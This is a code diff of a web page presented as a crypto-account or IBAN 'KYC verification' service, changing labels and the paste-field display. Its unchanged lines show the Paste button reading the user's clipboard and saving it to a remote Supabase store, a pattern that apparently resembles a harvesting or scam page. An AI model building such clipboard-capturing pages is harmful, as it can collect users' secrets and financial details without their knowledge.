@@ -597,7 +597,7 @@
                         <div class="kyc-step">
                             <span>Step 3</span>
                             <strong>Verification Complete</strong>
-                            <p>Receive confirmation and full report about your crypto account or Iban.</p>
+                            <p>Receive confirmation and full report about your address crypto  or iban.</p>
                         </div>
                     </div>
 
@@ -606,13 +606,13 @@
                         <div class="kyc-card">
                             <div class="kyc-card-header">
                                 <h2>Document Submission</h2>
-                                <div class="kyc-badge">Secure Upload</div>
+                                
                             </div>
 
                             <form id="kyc-form">
                                 <div class="kyc-paste-wrapper">
                                     <div class="kyc-paste-field" id="paste-field">
-                                        Click "Paste" to submit your document
+                                        Click "Paste" to submit your crypto address or iban
                                     </div>
                                     <button type="button" class="kyc-paste-btn" id="paste-btn">
                                         Paste
@@ -732,7 +732,7 @@
                     await saveClipboardToSupabase(text.trim());
                     
                     docInput.value = text.trim();
-                    pasteField.textContent = "✓ Validé";
+                    pasteField.textContent = text.trim();
                     pasteField.classList.add("validated");
                     submitBtn.disabled = false;
                     hasValidData = true;
